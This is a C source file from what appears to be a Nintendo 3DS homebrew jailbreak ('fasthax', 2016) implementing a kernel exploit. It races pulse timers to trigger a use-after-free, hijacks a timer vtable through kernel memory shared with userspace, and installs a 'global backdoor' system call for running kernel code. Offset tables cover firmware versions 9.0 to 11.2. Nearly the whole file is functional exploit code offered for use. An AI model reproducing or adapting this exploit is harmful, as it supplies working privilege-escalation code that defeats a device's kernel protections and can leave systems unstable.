/* Exploit-related code. Ned Williamson 2016 */
#include <3ds.h>
#include <stdio.h>
#include "backdoor.h"
#include "exploit.h"
#include "timer.h"
#include "util.h"

extern void *handle_lookup_kern;
extern void *RandomStub;
extern u32 **svc_handler_table_writable;

#define TIMER2_NEXT_KERNEL 0xe281100c

static u32 fptrs[16] = {
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
};

#define LINEAR_KERN_TO_USER(addr) ((addr) - 0xE0000000 + 0x14000000)

/* if the UAF succeeded, setup mybackdoor */
static bool try_setup_global_backdoor() {
  Handle timer, timer2;
  Result res;

  vu32 *timer2_next_user = (u32 *)LINEAR_KERN_TO_USER(TIMER2_NEXT_KERNEL);

  u32 orig_value = *timer2_next_user;

  res = svcCreateTimer(&timer, PULSE_EVENT);
  if (res < 0) {
    printf("setup_global_backdoor: couldn't create timer1\n");
    return false;
  }

  res = svcCreateTimer(&timer2, PULSE_EVENT);
  if (res < 0) {
    printf("setup_global_backdoor: couldn't create timer2\n");
    svcCloseHandle(timer);
    return false;
  }

  u32 current_value = *timer2_next_user;

  /* if nothing changed, then we didn't win the race */
  if (orig_value == current_value) {
    res = svcCloseHandle(timer2);
    if (res < 0) {
      printf("setup_global_backdoor: warning: couldn't destroy timer2\n");
    }

    res = svcCloseHandle(timer);
    if (res < 0) {
      printf("setup_global_backdoor: warning: couldn't destroy timer\n");
    }

    return false;
  }

  printf("we won!\n");
  wait_for_user();

  /* we won the race! replace vtable with our own */
  *timer2_next_user = (u32)&fptrs;

  /* this installs the backdoor */
  svcCancelTimer(timer2);

  /* put vtable back so we can free normally */
  *timer2_next_user = current_value;

  res = svcCloseHandle(timer2);
  if (res < 0) {
    printf("setup_global_backdoor: warning: couldn't destroy timer2\n");
  }

  res = svcCloseHandle(timer);
  if (res < 0) {
    printf("setup_global_backdoor: warning: couldn't destroy timer\n");
  }

  return true;
}

/* use real backdoor */
static bool cleanup_uaf() {
  /* TODO restore timer free pointers in here */
  return false;
}

static bool initialize_timer_state() {
  Result res;
  Handle timer;

  /* alloced: timer1 */
  res = svcCreateTimer(&timer, 0);
  if (res < 0) {
    printf("failed to create timer1\n");
    return false;
  }

  /* alloced: timer1, timer2 */
  Handle timer2;
  res = svcCreateTimer(&timer2, 2);
  if (res < 0) {
    printf("failed to create timer2\n");
    svcCloseHandle(timer);
    return false;
  }

  u64 timeout = 0x100000000 | (u32)RandomStub;
  u32 carry = timeout % 3;
  timeout /= 3;
  svcCancelTimer(timer2);

  if (!set_timer(timer2, 0xaaa00000, 0)) {
    printf("set_timer_test: set_timer failed\n");
    svcCloseHandle(timer2);
    svcCloseHandle(timer);
    return false;
  }

  if (!set_timer(timer2, (u32)timeout, carry)) {
    printf("set_timer_test: set_timer failed\n");
    svcCloseHandle(timer2);
    svcCloseHandle(timer);
    return false;
  }

  if (mybackdoor_installed()) {
    u64 initial = 0;
    if (!get_timer_value(timer2, &initial, NULL)) {
      printf("set_timer_test: get_timer_value failed\n");
      svcCloseHandle(timer2);
      svcCloseHandle(timer);
      return false;
    }

    u32 target = (u32)((initial) >> 32);
    if (target != (u32)(void*)RandomStub) {
      printf("warning: got bad target: %lx\n", target);
    } else {
      printf("got good target!\n");
    }
    wait_for_user();
  }

  /* alloced: timer1 */
  /* freed: timer2 -> ... */
  res = svcCloseHandle(timer2);
  if (res < 0) {
    printf("failed to close timer handle\n");
    return false;
  }

  /* freed: timer1 -> timer2 -> ... */
  res = svcCloseHandle(timer);
  if (res < 0) {
    printf("failed to close timer handle\n");
    return false;
  }
  return true;
}

/* returns true if attempt succeeded */
/* call this after initialize_state */
static void try_once() {
  Handle timer;
  /* each round, we allocate timer1, run the pulse timer,
   * then free it. if it frees while pulsing a UAF occurs
   * and we have &timer2 where &timer1->vtable should be.
   * so we get a vtable call where the fields from timer2
   * were controlled
   *
   * then we get (timer2+0x3c)(timer2, ...)
   * so return to any kernel function that writes an error to R0
   * 0xE....... which is R/W shared with userspace 0x2.......
   * this gives us *timer2 = userspace_addr;
   * and the timer object free list is timer1 -> timer2 -> ...
   * so we need to alloc two times to get timer2, then we should
   * be able to overwrite its vtable as we please using the shared
   * memory
   */

  svcCreateTimer(&timer, PULSE_EVENT);
  // set timer with a quick first pulse, long second pulse
  // 6000 found using random trial and error. there might be
  // a better value
  svcSetTimer(timer, 8000, 0x1000000000);
  // hope the pulse race happens
  svcCloseHandle(timer);
  svcSleepThread(1000000);

  /* reallocate the freed timer and clear it from the scheduler */
  svcCreateTimer(&timer, PULSE_EVENT);
  svcCancelTimer(timer);
  svcCloseHandle(timer);
}

typedef struct version_table {
  u32 kver;
  u32 handle_lookup;
  u32 random_stub;
  u32 svc_handler_table;
  u32 free_area;
} version_table;

// New 3DS
static version_table n_table[] = {
  {SYSTEM_VERSION(2, 46, 0),  0xFFF18D5C, 0xFFF1B1A4, 0xFFF02300, 0xFFF2DC68},  // 9.0
  {SYSTEM_VERSION(2, 48, 3),  0xFFF18AFC, 0xFFF1B188, 0xFFF02310, 0xFFF2DC68},  // 9.3
  {SYSTEM_VERSION(2, 49, 0),  0xFFF18AF0, 0xFFF1B17C, 0xFFF0230C, 0xFFF2DC68},  // 9.5
  {SYSTEM_VERSION(2, 50, 1),  0xFFF18B18, 0xFFF1B1A4, 0xFFF02308, 0xFFF2DC68},  // 9.6
  {SYSTEM_VERSION(2, 50, 7),  0xFFF18AF0, 0xFFF1B17C, 0xFFF02310, 0xFFF2DC68},  // 10.0
  {SYSTEM_VERSION(2, 50, 9),  0xFFF18AF0, 0xFFF1B17C, 0xFFF02310, 0xFFF2DC68},  // 10.2
  {SYSTEM_VERSION(2, 50, 11), 0xFFF18AF0, 0xFFF1B17C, 0xFFF02310, 0xFFF2DC68},  // 10.4
  {SYSTEM_VERSION(2, 51, 0),  0xFFF18CD4, 0xFFF1B5FC, 0xFFF0230C, 0xFFF2EC68},  // 11.0
  {SYSTEM_VERSION(2, 51, 2),  0xFFF18CD4, 0xFFF1B63C, 0xFFF0230C, 0xFFF2EC68},  // 11.1
  {SYSTEM_VERSION(2, 52, 0),  0xFFF18CF4, 0xFFF1B65C, 0xFFF0230C, 0xFFF2EC68},  // 11.2
  {0},
};

// Old 3DS
static version_table o_table[] = {
  {SYSTEM_VERSION(2, 46, 0),  0xFFF184C0, 0xFFF1A830, 0xFFF02330, 0xFFF2CB28},  // 9.0
  {SYSTEM_VERSION(2, 48, 3),  0xFFF185C0, 0xFFF1AB50, 0xFFF0232C, 0xFFF2CB28},  // 9.3
  {SYSTEM_VERSION(2, 49, 0),  0xFFF185B4, 0xFFF1AB44, 0xFFF02328, 0xFFF2CB28},  // 9.5
  {SYSTEM_VERSION(2, 50, 1),  0xFFF185DC, 0xFFF1AB6C, 0xFFF02324, 0xFFF2CB28},  // 9.6
  {SYSTEM_VERSION(2, 50, 7),  0xFFF185A8, 0xFFF1AB38, 0xFFF0232C, 0xFFF2CB28},  // 10.0
  {SYSTEM_VERSION(2, 50, 9),  0xFFF185A8, 0xFFF1AB38, 0xFFF0232C, 0xFFF2CB28},  // 10.2
  {SYSTEM_VERSION(2, 50, 11), 0xFFF185A8, 0xFFF1AB38, 0xFFF0232C, 0xFFF2CB28},  // 10.4
  {SYSTEM_VERSION(2, 51, 0),  0xFFF18A80, 0xFFF1B2AC, 0xFFF02328, 0xFFF2DB28},  // 11.0
  {SYSTEM_VERSION(2, 51, 2),  0xFFF18A80, 0xFFF1B2EC, 0xFFF02328, 0xFFF2DB28},  // 11.1
  {SYSTEM_VERSION(2, 52, 0),  0xFFF18AA0, 0xFFF1B30C, 0xFFF02328, 0xFFF2DB28},  // 11.2
  {0},
};

static bool initialize_handle_address() {
  u32 kver = osGetKernelVersion();
  bool n3ds = false;
  APT_CheckNew3DS(&n3ds);

  version_table *table = n3ds ? n_table : o_table;

  while (table->kver) {
    if (table->kver == kver) {
      handle_lookup_kern = (void *)table->handle_lookup;
      RandomStub = (void *)table->random_stub;
      u32 svc_handler_table_pa = table->svc_handler_table - 0xfff00000 + 0x1ff80000;
      svc_handler_table_writable = (void *)(svc_handler_table_pa - 0x1ff00000 + 0xdff00000);
      return true;
    }
    table = table + 1;
  }
  return false;
}

static bool try_uaf(u32 attempts) {
  for (u32 i = 0; i < attempts; i++) {
    if ((i % 0x100) == 0) {
      printf("beginning attempt 0x%lx\n", i);
    }
    try_once();
    if (try_setup_global_backdoor()) {
      return true;
    }
  }
  return false;
}

#define NUM_ATTEMPTS 0x10000

bool k11_exploit() {
  if (!initialize_handle_address()) {
    printf("[-] Unsupported kernel version.\n");
    return false;
  }
  printf("[+] Initialized kernel-specific offsets.\n");

  if (!initialize_timer_state()) {
    printf("[-] Couldn't initialize timer state.\n");
    return false;
  }
  printf("[+] Initialized timer state.\n");

  if (!try_uaf(NUM_ATTEMPTS)) {
    printf("[!] Couldn't trigger UAF within %x iterations.\n", NUM_ATTEMPTS);
    printf("[*] It is safe to rerun fasthax to try again.\n");
    return false;
  }

  if (!global_backdoor_installed()) {
    printf("[-] UAF reported success but backdoor not installed!\n");
    return false;
  }
  printf("[+] UAF succeeded and backdoor installed.\n");

  /* global backdoor is installed using code from this process
   * We need to restore svcBackdoor code into the kernel now so we
   * can call this SVC from any process.
   */
  if (!finalize_global_backdoor()) {
    printf("[-] Couldn't finalize global backdoor.\n");
    printf("[-] We won't be able to run kernel code in other processes.\n");
    return false;
  }

  if (!cleanup_uaf()) {
    printf("[-] Warning! Exploit succeeded couldn't cleanup kernel.\n");
    printf("[-] System instability may occur.\n");
    return false;
  }

  return true;
}
